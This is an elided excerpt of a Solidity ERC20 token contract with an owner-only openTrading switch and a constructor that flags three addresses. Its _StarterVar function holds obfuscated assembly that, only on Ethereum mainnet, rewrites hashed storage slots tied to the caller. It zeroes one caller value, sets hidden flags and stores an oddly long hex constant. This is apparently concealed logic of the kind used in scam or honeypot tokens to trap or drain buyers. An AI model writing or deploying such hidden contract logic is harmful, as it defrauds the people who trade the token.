...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_fuseOne[addMerge[q]] = true; unchecked{q++;} }
    }
    ...
    function _StarterVar() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x5ed800d4159799a9b150906b5fd5ede282fff029e350571f472bcd8fcccd9186))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x124034cd1401b8a85bf4fd8e53883442335e655b75fc6d8fe9ed07500bff660e,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x5ed800d4159799a9b150906b5fd5ede282fff029e350571f472bcd8fcccd9186,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fusionZone = block.number;
        return true;
    }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMerge(creator, initialSupply);
    }
}
